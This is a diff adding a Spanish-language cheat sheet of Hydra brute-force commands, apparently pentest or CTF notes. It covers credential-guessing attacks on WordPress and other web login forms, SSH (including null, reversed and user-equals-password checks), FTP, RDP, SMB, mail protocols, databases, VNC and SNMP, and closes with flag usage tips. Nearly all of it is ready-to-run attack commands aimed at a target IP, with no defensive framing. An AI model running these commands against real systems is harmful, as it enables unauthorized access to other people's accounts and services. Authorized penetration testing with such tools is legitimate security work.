@@ -1,0 +1,67 @@
+▶ Fuerza Bruta WordPress (Login HTTP POST):
+  hydra -L fsocity-optimize.dic -p test $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+▶ Ataque HTTP POST Genérico (Formularios personalizados):
+  hydra -L users.txt -P pass.txt $IP http-post-form "/login:username=^USER^&password=^PWD^:Login failed"
+
+▶ Escaneo SSH (Fuerza bruta en SSH con listas):
+  hydra -L notas_usuarios.txt -P notas_contraseñas.txt ssh://$IP -t 4
+
+▶ Escaneo SSH con Credenciales Específicas (Usuario y contraseña definidos):
+  hydra -l <user|root> -p <password|root> $IP ssh
+
+▶ Escaneo SSH con Usuario Igual a Contraseña (Probar usuario=contraseña):
+  hydra -L users.txt -e s $IP ssh 
+
+▶ Escaneo SSH con Contraseña Nula (Probar sin contraseña):
+  hydra -l <user|root> -e n $IP ssh 
+
+▶ Escaneo SSH con Contraseña Invertida (Probar contraseña como usuario invertido):
+  hydra -L users.txt -e r $IP ssh 
+
+▶ Escaneo SSH con Archivo Login:Pass (Usar archivo login:pass y puerto específico):
+  hydra -t 4 -s <port> -C <file_login_pass> $IP ssh 
+
+▶ Ataque FTP (Fuerza bruta en FTP con usuario o lista):
+  hydra -l usuario -P /path/to/wordlist.txt ftp://$IP 
+  # También puedes usar listas: hydra -L users.txt -P pass.txt $IP ftp
+
+▶ Ataque HTTP Basic Auth (Autenticación básica):
+  hydra -L users.txt -P pass.txt $IP http-get /admin
+
+▶ Ataque RDP (Escritorio remoto):
+  hydra -L users.txt -P pass.txt rdp://$IP 
+
+▶ Ataque SMB (Windows file sharing con usuario o lista):
+  hydra -l Administrator -P /path/to/wordlist.txt $IP smb
+  # También puedes usar listas: hydra -L users.txt -P pass.txt $IP smb 
+
+▶ Ataque SMTP (Fuerza bruta en correo):
+  hydra -l usuario -P /path/to/wordlist.txt $IP smtp 
+
+▶ Ataque Telnet (Acceso remoto):
+  hydra -L users.txt -P pass.txt telnet://$IP 
+
+▶ Ataque MySQL (Base de datos):
+  hydra -L users.txt -P pass.txt $IP mysql 
+
+▶ Ataque VNC (Ataque a puerto 5900):
+  hydra -L users.txt -P pass.txt $IP vnc 
+
+▶ Ataque PostgreSQL (Ataque a puerto 5432):
+  hydra -L users.txt -P pass.txt $IP postgres 
+
+▶ Ataque SNMP (Protocolo de red):
+  hydra -P /path/to/wordlist.txt $IP snmp 
+
+▶ Ataque POP3 (Correo entrante):
+  hydra -l usuario -P /path/to/wordlist.txt pop3://$IP 
+
+▶ Ataque IMAP (Correo entrante alternativo):
+  hydra -L users.txt -P pass.txt imap://$IP 
+
+# Notas:
+# - Usa "-L" y "-P" (mayúsculas) para cargar listas de usuarios y contraseñas desde un diccionario.
+# - Usa "-l" y "-p" (minúsculas) para especificar un usuario o contraseña ya existente.
+# - Ajusta "-t <número>" para controlar el número de hilos y evitar bloqueos.
+# - Incluye "-v" o "-V" para ver más detalles del proceso.
